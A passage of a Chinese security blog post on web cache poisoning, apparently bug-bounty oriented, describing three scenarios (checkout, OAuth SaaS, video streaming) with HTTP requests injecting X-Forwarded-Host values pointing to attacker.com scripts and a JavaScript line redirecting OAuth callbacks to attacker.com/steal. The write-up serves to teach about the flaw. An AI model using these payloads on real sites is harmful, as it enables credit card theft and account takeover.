+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/checkout</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>attacker.com/fake-payment.js<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>影响：</strong><ul>
+<li>注入假支付表单</li>
+<li>窃取信用卡号</li>
+<li>每 5 分钟周期影响 347 个用户</li>
+<li>PCI-DSS 违规</li>
+</ul>
+</li>
+</ol>
+<h3 id="场景-2：SaaS-认证"><a href="#场景-2：SaaS-认证" class="headerlink" title="场景 2：SaaS 认证"></a>场景 2：SaaS 认证</h3><p><strong>目标</strong>：具有 OAuth SSO 的 B2B SaaS 平台</p>
+<p><strong>攻击路径：</strong></p>
+<ol>
+<li><p><strong>侦察：</strong></p>
+<ul>
+<li>OAuth 回调：<code>/auth/callback</code></li>
+<li>state Cookie 没有 HttpOnly</li>
+<li>回调 URL 来自 Cookie 值</li>
+</ul>
+</li>
+<li><p><strong>利用链：</strong></p>
+</li>
+</ol>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"># 步骤 1：投毒主页<br><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>attacker.com/oauth-hijack.js<br></code></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// oauth-hijack.js 设置恶意回调</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;oauth_callback=https://attacker.com/steal&quot;</span>;<br></code></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"># 步骤 2：投毒回调处理器<br><span class="hljs-keyword">GET</span> <span class="hljs-string">/auth/callback</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>attacker.com/steal-code.js<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>影响：</strong><ul>
+<li>完整 OAuth 流程劫持</li>
+<li>授权码泄露</li>
+<li>完全账户接管</li>
+<li>多租户数据泄露风险</li>
+</ul>
+</li>
+</ol>
+<h3 id="场景-3：媒体平台"><a href="#场景-3：媒体平台" class="headerlink" title="场景 3：媒体平台"></a>场景 3：媒体平台</h3><p><strong>目标</strong>：视频流媒体服务</p>
+<p><strong>攻击路径：</strong></p>
+<ol>
+<li><p><strong>侦察：</strong></p>
+<ul>
+<li>视频播放器页面：<code>/watch?v=12345</code></li>
+<li>高流量：每日 50 万次视频观看</li>
+<li>移动应用共享相同缓存</li>
+</ul>
+</li>
+<li><p><strong>利用：</strong></p>
+</li>
+</ol>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/watch?v=12345</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mobile App/1.0<br><span class="hljs-attribute">X-Forwarded-Host</span><span class="hljs-punctuation">: </span>attacker.com/malware.js<br></code></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>影响：</strong><ul>
+<li>专门针对移动用户</li>
+<li>通过受信任域名分发恶意软件</li>
+<li>广告欺诈注入</li>
+<li>订阅者凭据窃取</li>
+</ul>
+</li>
+</ol>
+<p><strong>报告价值</strong>：$10,000 — $18,000</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/" class="print-no-link">#缓存投毒</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>缓存投毒 - 2</div>
+      <div>https://xiaobite-hacker.github.io/2026/05/02/缓存投毒-2/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xiaobite</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年5月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/05/02/SSRF%EF%BC%9A%E7%AA%83%E5%8F%96AWS%E5%AF%86%E9%92%A5%E5%B9%B6%E8%8E%B7%E5%BE%97%E9%93%AD%E6%84%9F%E4%BF%A1%E6%81%AF/" title="SSRF：窃取 AWS 密钥获得铭感信息">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SSRF：窃取 AWS 密钥获得铭感信息</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/05/02/%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92-1/" title="缓存投毒 - 1">
+                        <span class="hidden-mobile">缓存投毒 - 1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
